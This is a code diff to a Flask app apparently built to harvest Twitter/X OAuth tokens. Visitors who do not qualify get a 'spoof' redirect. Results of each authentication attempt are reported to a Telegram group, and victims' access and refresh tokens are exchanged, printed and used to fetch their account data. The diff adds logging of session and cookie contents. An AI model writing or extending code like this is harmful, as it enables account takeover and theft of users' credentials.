@@ -108,8 +108,10 @@ def oauth():
         twitter_oauth_url = generate_twitter_oauth_url()
         
         session.modified = True
+        print("SESSION BEFORE REDIRECT:", dict(session))
         resp = redirect(twitter_oauth_url)
         current_app.session_interface.save_session(current_app, session, resp)
+        print("SET-COOKIE HEADER:", resp.headers.get("Set-Cookie"))
         return resp
     else:
         return redirect(spoof)
@@ -126,17 +128,17 @@ def generate_twitter_oauth_url():
 
 @app.route('/auth')
 def auth_callback():
+    group_id = session.get("group_id")
+    
+    authorization_code = request.args.get('code')
+    if not authorization_code:
+        send_telegram_message(group_id, "❌ *User has cancelled authentication.*")
+        return redirect("https://x.com/")
+        
+    access_token, refresh_token = exchange_token_for_access(authorization_code)
+    print(f"access token: {access_token} | refresh token: {refresh_token} | group id: {group_id}")
+        
     try:
-        group_id = session.get("group_id")
-        
-        authorization_code = request.args.get('code')
-        if not authorization_code:
-            send_telegram_message(group_id, "❌ *User has cancelled authentication.*")
-            return redirect("https://x.com/")
-            
-        access_token, refresh_token = exchange_token_for_access(authorization_code)
-        print(f"access token: {access_token} | refresh token: {refresh_token} | group id: {group_id}")
-        
         user_data = get_twitter_user_data(access_token)
         print(user_data)
         user_id = user_data['id']
